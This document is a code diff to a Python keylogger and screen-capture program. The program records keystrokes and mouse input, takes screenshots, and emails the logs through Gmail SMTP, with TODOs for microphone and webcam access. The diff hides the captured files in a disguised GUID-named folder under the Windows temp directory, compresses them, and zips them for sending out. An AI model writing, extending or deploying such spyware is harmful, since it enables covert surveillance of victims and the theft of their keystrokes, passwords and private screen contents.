@@ -1,4 +1,7 @@
 # Third Party Modules
+import shutil
+import zlib
+
 from pynput.keyboard import Listener as k_Listener
 from pynput.mouse import Listener as m_Listener
 import mss.tools
@@ -14,13 +17,13 @@ import os
 import time
 import requests
 import socket
-import random
 import sys
 import smtplib
 
 # User Defined Modules
 from LogModel import LogModel
 from UserModel import UserModel
+
 
 # TODO Microphone Access
 # TODO Webcam Access
@@ -125,9 +128,12 @@ class Logger:
 
     def write_file(self):
 
-        filepath = os.path.expanduser('~') + '/Downloads/'
-        filename = self.user + str(random.randint(11111, 99999)) + '.txt'
-        file = filepath + filename
+        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+        if not os.path.exists(dirname):
+            os.mkdir(dirname)
+
+        filename = self.user + "".join(self.datetime.replace(":", ".")) + '.txt'
+        file = dirname + "\\" + filename
 
         previous_log_text = ''
         previous_log_header = ''
@@ -161,21 +167,26 @@ class Logger:
         # TODO Compress image
 
         with mss.mss() as screen:
+            screen.compression_level = 9
             # Select all monitors
             monitor = screen.monitors[0]
             # Grab the picture
             im = screen.grab(monitor)
             # Get the entire PNG raw bytes
-            raw_bytes = mss.tools.to_png(im.rgb, im.size)
+            raw_bytes = mss.tools.to_png(im.rgb, im.size, level=9)
 
         return raw_bytes
 
     def write_screenshot(self):
 
+        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+        if not os.path.exists(dirname):
+            os.mkdir(dirname)
+
         raw_bytes = self.get_screenshot()
-        filepath = os.path.expanduser('~') + '/Downloads/'
-        filename = self.user + str(random.randint(11111, 99999)) + '.png'
-        path = filepath + filename
+        self.datetime = time.ctime(time.time())
+        filename = self.user + "".join(self.datetime.replace(":", ".")) + '.png'
+        path = dirname + "\\" + filename
         with open(path, "wb") as file:
             file.write(raw_bytes)
 
@@ -194,6 +205,7 @@ class Logger:
 
             if elapsed_time > seconds:
                 print("Event finished")
+                dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
                 break
 
     def send_email(self):
@@ -203,6 +215,11 @@ class Logger:
         message = self.Log.toString().encode()
 
         # TODO Add Mimes
+
+        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+        if os.path.exists(dirname):
+            archive_name = dirname + self.user
+            shutil.make_archive(archive_name, 'zip', dirname)
 
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
